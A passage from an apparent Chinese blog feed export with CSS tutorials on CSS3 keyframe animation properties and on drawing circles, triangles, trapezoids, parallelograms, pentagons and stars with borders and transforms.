title="动画(animation)"></a>动画(animation)</h1><p>CSS3的动画是个很不错的技术，基本能取代一些动图，javascript，flash等；</p><p>而动画里最重要的概念就是<strong>关键帧</strong>，也许你用PS做gif动图的时候看见过这个概念，所谓动画就是一帧一帧图片连续切换实现的效果，关键帧就是里面主要的一些帧；</p><p>实现CSS动画也需要设置关键帧 <code>@keyframes</code>：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token atrule"><span class="token rule">@keyframes</span> my-animation</span> <span class="token punctuation">&#123;</span>    <span class="token selector">0%</span> <span class="token punctuation">&#123;</span>        <span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token selector">50%</span> <span class="token punctuation">&#123;</span>        <span class="token property">color</span><span class="token punctuation">:</span> green<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token selector">100%</span> <span class="token punctuation">&#123;</span>        <span class="token property">color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>格式如上，@keyframes后面跟的是自定义的<strong>动画名称</strong>，后面会用到。里面的**0%，50%，100%**便是设置的三个关键帧及其对应样式，如果只需要设置首尾两个关键帧，可以这样写：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token atrule"><span class="token rule">@keyframes</span> my-animation</span> <span class="token punctuation">&#123;</span>    <span class="token selector">from</span> <span class="token punctuation">&#123;</span>        <span class="token property">color</span><span class="token punctuation">:</span> green<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token selector">to</span> <span class="token punctuation">&#123;</span>        <span class="token property">color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果：</p><p><img src="https://i.loli.net/2019/01/26/5c4c4eae8329a.gif" alt="image"></p><p>当然样式除了color还能设置多项样式；</p><p>定义好关键帧后就直接在需要应用动画的元素标签内使用就行了，格式及所有属性如下：</p><pre class="line-numbers language-none"><code class="language-none">p &#123;    animation-name: my-animation;    animation-duration: 3s;    animation-timing-function: ease;    animation-delay: 0;    animation-iteration-count: 3;    animation-direction: normal;    animation-play-state: running;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现了吧，很多属性和<strong>transition</strong>里面一样，简单介绍下：</p><ul><li><strong>animation-name</strong></li></ul><p>就是之前跟在@keyframea后面的自定义名称，之前设置的是 <code>my-animation</code>;</p><ul><li><strong>animation-duration</strong></li><li><strong>animation-timing-function</strong></li><li><strong>animation-delay</strong></li></ul><p>和前面一样，默认分别为 <code>0, ease, 0</code>；</p><ul><li><strong>animation-iteration-count</strong></li></ul><p>动画播放的次数，默认 <code>1</code>，但一般设置为 <code>infinite</code>，即无限循环；</p><ul><li><strong>animation-direction</strong></li></ul><p>动画播放的方向，<code>normal</code>为默认，正向播放，<code>reverse</code>为反向播放，<code>alternate</code>为正向后反向，<code>alternate-reverse</code>为反向后正向；</p><ul><li><strong>animation-play-state</strong></li></ul><p>播放状态，默认 <code>running</code>，运行，<code>paused</code>为暂停，可以在javascript中使用对动画进行控制；</p><p>当然，这个属性比之前的transition还多，也有简便写法：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">p</span> <span class="token punctuation">&#123;</span>    <span class="token property">animation</span><span class="token punctuation">:</span> my-animation 3s linear infinite alternate<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其中 <code>animation-name</code> 和 <code>animation-duration</code>为必须设置的属性；</p><p>同样，记得考虑浏览器兼容：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token atrule"><span class="token rule">@-webkit-keyframes</span> mycanimation</span> <span class="token punctuation">&#123;</span>    <span class="token selector">from</span> <span class="token punctuation">&#123;</span>        <span class="token property">color</span><span class="token punctuation">:</span> green<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token selector">to</span> <span class="token punctuation">&#123;</span>        <span class="token property">color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token selector">p</span> <span class="token punctuation">&#123;</span>    <span class="token property">-webkit-animation</span><span class="token punctuation">:</span> my-animation 3s linear infinite<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* -moz-, -ms-, -o- 格式类似 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css3过渡 css3动画 transition animation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用 CSS 画一些多边形状</title>
      <link href="/2024/09/27/css/yong-css-hua-yi-xie-duo-bian-xing-zhuang/"/>
      <url>/2024/09/27/css/yong-css-hua-yi-xie-duo-bian-xing-zhuang/</url>
      
        <content type="html"><![CDATA[<p>CSS是个很强大的网页开发工具，使生硬的网页变得丰富绚丽，css能实现很多效果，比如css3中的过渡与动画效果都很好看，最基本的就是画一个具有长宽的矩形，通过设置 <code>border-radius</code> 又能实现画圆形和椭圆形，但是其他多边形似乎没有直接能用的属性，比如<strong>三角形</strong>，<strong>五角星</strong>，<strong>六边形</strong>等等；</p><p>下面根据几何顺序依次来实现一下：</p><h1 id="圆形"><a href="#圆形" class="headerlink" title="圆形"></a>圆形</h1><html><div style="border:1px solid green;padding:10px;">    <div style="width:40px;    height:40px;    background:red;    border-radius:20px;"></div></div><br /></html><blockquote><h4 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h4></blockquote><p>在长宽相等的正方形中使用 <code>border-radius</code> 属性，其值等于长或宽的一半；</p><p>代码：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CSS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">        <span class="token selector">div</span> <span class="token punctuation">&#123;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>            <span class="token property">background</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="椭圆形"><a href="#椭圆形" class="headerlink" title="椭圆形"></a>椭圆形</h1><html><div style="border:1px solid green;padding:10px;">    <div style="width:60px;    height:40px;    background:red;    border-radius:50%"></div></div><br /></html><blockquote><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4></blockquote><p>同样是 <code>border-radius</code> 属性，只不过其值有变化，使用 <code>border-radius: 30px/20px</code>，意思是原矩形宽度方向半径设为 30px，高度方向半径设为 20px，或者简写为 <code>boder-radius: 50%</code>，一个意思，宽度和高度方向的半径各位宽度和高度的一半；</p><p>代码：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CSS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">        <span class="token selector">div</span> <span class="token punctuation">&#123;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>            <span class="token property">background</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 30px / 20px<span class="token punctuation">;</span>            <span class="token comment">/* 或者这样            border-radius: 50%;            */</span>        <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="三边形"><a href="#三边形" class="headerlink" title="三边形"></a>三边形</h1><html><div style="border:1px solid green;padding:10px;">    <div style="width:30px;    height:40px;    border-left:20px solid transparent;    border-right:20px solid transparent;    border-bottom:40px solid red;"></div></div><br /></html><blockquote><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4></blockquote><p>没有直接能用的三角形的属性，可以利用CSS的<strong>盒子模型</strong>，就是下面这种，像 <code>&lt;p&gt;, &lt;h1&gt;, &lt;div&gt;</code> 这些标签都是一个“盒子”，标签内的文本是内容区，周围的彩色边界设置的是 <code>border</code> 值，当然还有边界与内容区中间的 <code>padding</code> 值，以及边界外的 <code>margin</code> 值；</p><html><div style="border:1px solid green;padding:10px">    <div style="width: 60px;    height: 40px;    background: red;    color: white;    border-top:10px solid green;    border-bottom: 10px solid blue;    border-left: 15px solid yellow;    border-right: 15px solid aqua">内容</div></div><br /></html><p>所以由图就能想到办法了，就是让某一条边界的宽度值直接等于盒子的宽度，并设置一个边界颜色，其他边界线设置不同的宽度值来调整三角形的斜度，并把边界线颜色设置为透明 <code>transparent</code> 即可；</p><p>代码：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CSS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">        <span class="token selector">div</span> <span class="token punctuation">&#123;</span>            <span class="token property">width</span><span class="token punctuation">:</span>30px<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span>40px<span class="token punctuation">;</span>            <span class="token property">border-left</span><span class="token punctuation">:</span>20px solid transparent<span class="token punctuation">;</span>            <span class="token property">border-right</span><span class="token punctuation">:</span>20px solid transparent<span class="token punctuation">;</span>            <span class="token property">border-bottom</span><span class="token punctuation">:</span>40px solid red<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="矩形"><a href="#矩形" class="headerlink" title="矩形"></a>矩形</h1><html><div style="border:1px solid green;padding:10px">    <div style="width: 60px;    height: 40px;    background: red;"></div></div><br /></html><p>最简单的形状，就不分析了；</p><h1 id="梯形"><a href="#梯形" class="headerlink" title="梯形"></a>梯形</h1><html><div style="border:1px solid green;padding:10px">    <div style="width: 60px;    height: 40px;    border-left: 10px solid transparent;    border-right: 10px solid transparent;    border-bottom: 40px solid red;"></div></div><br /></html><blockquote><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4></blockquote><p>方法有些像三角形，只不过底部边界线宽度等于矩形高度，左右两边的边界线宽度小于矩形宽度值即可（感觉这两句话绕就比划着再读几遍 -_-）;</p><p>代码：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CSS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">        <span class="token selector">div</span> <span class="token punctuation">&#123;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 60px<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>            <span class="token property">border-left</span><span class="token punctuation">:</span> 10px solid transparent<span class="token punctuation">;</span>            <span class="token property">border-right</span><span class="token punctuation">:</span> 10px solid transparent<span class="token punctuation">;</span>            <span class="token property">border-bottom</span><span class="token punctuation">:</span> 40px solid red<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="平行四边形"><a href="#平行四边形" class="headerlink" title="平行四边形"></a>平行四边形</h1><html><div style="border:1px solid green;padding:10px">    <div style="display: inline-block;    width: 60px;    height: 40px;    border-left: 10px solid transparent;    border-bottom: 40px solid red;">    </div><div style="display: inline-block;    width: 10px;    height: 40px;    border-left: 10px solid red;    border-bottom: 40px solid transparent;"></div></div><br /></html><blockquote><h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4></blockquote><p>看成一个倾斜过的矩形，所以可以使用 <code>transform: skew()</code> 属性，括号内是倾斜角度，比如30度就是 <code>30deg</code>，还有 <code>transform</code> 是CSS3中的一个新属性，所以需要加浏览器前缀进行兼容，例如 ：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">skew</span><span class="token punctuation">(</span>30deg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">-webkit-transform</span><span class="token punctuation">:</span> <span class="token function">skew</span><span class="token punctuation">(</span>30deg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">-moz-transform</span><span class="token punctuation">:</span> <span class="token function">skew</span><span class="token punctuation">(</span>30deg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">-ms-transform</span><span class="token punctuation">:</span> <span class="token function">skew</span><span class="token punctuation">(</span>30deg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">-o-transform</span><span class="token punctuation">:</span> <span class="token function">skew</span><span class="token punctuation">(</span>30deg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外脑洞够大可以发挥一下想象，平行四边形可以看成一个直角梯形与一个直角三角形的组合，或者一个矩形与两个直角三角形的组合；</p><p>直角梯形与直角三角形组合的代码：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CSS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">        <span class="token selector">#div0</span> <span class="token punctuation">&#123;</span>            <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 60px<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>            <span class="token property">border-left</span><span class="token punctuation">:</span> 10px solid transparent<span class="token punctuation">;</span>            <span class="token property">border-bottom</span><span class="token punctuation">:</span> 40px solid red<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">#div1</span> <span class="token punctuation">&#123;</span>            <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>            <span class="token property">border-left</span><span class="token punctuation">:</span> 10px solid red<span class="token punctuation">;</span>            <span class="token property">border-bottom</span><span class="token punctuation">:</span> 40px solid transparent<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>div0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--    --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>div1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意：</strong> 两个 <code>&lt;div&gt;</code> 标签之间如果有<strong>换行</strong>或者空格的话，最终两个块图形间会出现一条<strong>细缝</strong>，所以写的时候就要避免换行，或者像上面一样把换行<strong>注释掉</strong>；</p><h1 id="五边形"><a href="#五边形" class="headerlink" title="五边形"></a>五边形</h1><html><div style="border:1px solid green;padding:10px">    <div style="width: 50px;    height: 10px;    border-left: 25px solid transparent;    border-right: 25px solid transparent;    border-bottom: 10px solid red;">    </div><div style="width: 50px;    height: 40px;    border-top: 40px solid red;    border-left: 10px solid transparent;    border-right: 10px solid transparent;"></div></div><br /></html><blockquote><p>分析</p></blockquote><p>五边形可以看成上面的三角形与下面梯形的组合，当然数学好的可以计算一下尺寸就能画出一个正五边形了；</p><p>代码：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CSS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">        <span class="token selector">#div0</span> <span class="token punctuation">&#123;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">border-left</span><span class="token punctuation">:</span> 25px solid transparent<span class="token punctuation">;</span>            <span class="token property">border-right</span><span class="token punctuation">:</span> 25px solid transparent<span class="token punctuation">;</span>            <span class="token property">border-bottom</span><span class="token punctuation">:</span> 10px solid red<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">#div1</span> <span class="token punctuation">&#123;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>            <span class="token property">border-top</span><span class="token punctuation">:</span> 40px solid red<span class="token punctuation">;</span>            <span class="token property">border-left</span><span class="token punctuation">:</span> 10px solid transparent<span class="token punctuation">;</span>            <span class="token property">border-right</span><span class="token punctuation">:</span> 10px solid transparent<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>div0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>div1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>更多边的形状基本思路都一样，想着用三角形，矩形，梯形这些基本形象进行组合基本上都能实现，下面的形状就只放形状和源码了；</p><h1 id="五角星"><a href="#五角星" class="headerlink" title="五角星"></a>五角星</h1><html><div style="border:1px solid green;padding:10px">    <div style="width: 40px;    height: 60px;    border-left: 20px solid transparent;    border-right: 20px solid transparent;    border-bottom: 60px solid red;">        <div style="height: 20px;"></div>        <div style="width: 60px;        height: 18px;        border-top: 25px solid red;        border-left: 30px solid transparent;        border-right: 30px solid transparent;        margin-left: -30px;"></div>        <div style="width: 40px;        height: 15px;        border-left: 20px solid transparent;        border-right: 20px solid transparent;        border-bottom: 15px solid white;        margin-left: -20px;"></div>    </div></div><br /></html><p>代码：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CSS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">        <span class="token selector">#div0</span> <span class="token punctuation">&#123;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 60px<span class="token punctuation">;</span>            <span class="token property">border-left</span><span class="token punctuation">:</span> 20px solid transparent<span class="token punctuation">;</span>            <span class="token property">border-right</span><span class="token punctuation">:</span> 20px solid transparent<span class="token punctuation">;</span>            <span class="token property">border-bottom</span><span class="token punctuation">:</span> 60px solid red<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">#div1</span> <span class="token punctuation">&#123;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token selector">#div2</span> <span class="token punctuation">&#123;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 60px<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 18px<span class="token punctuation">;</span>            <span class="token property">border-top</span><span class="token punctuation">:</span> 25px solid red<span class="token punctuation">;</span>            <span class="token property">border-left</span><span class="token punctuation">:</span> 30px solid transparent<span class="token punctuation">;</span>            <span class="token property">border-right</span><span class="token punctuation">:</span> 30px solid transparent<span class="token punctuation">;</span>            <span class="token property">margin-left</span><span class="token punctuation">:</span> -30px<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">#div3</span> <span class="token punctuation">&#123;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 15px<span class="token punctuation">;</span>            <span class="token property">border-left</span><span class="token punctuation">:</span> 20px solid transparent<span class="token punctuation">;</span>            <span class="token property">border-right</span><span class="token punctuation">:</span> 20px solid transparent<span class="token punctuation">;</span>            <span class="token property">border-bottom</span><span class="token punctuation">:</span> 15px solid white<span class="token punctuation">;</span>            <span class="token property">margin-left</span><span class="token punctuation">:</span> -20px<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token 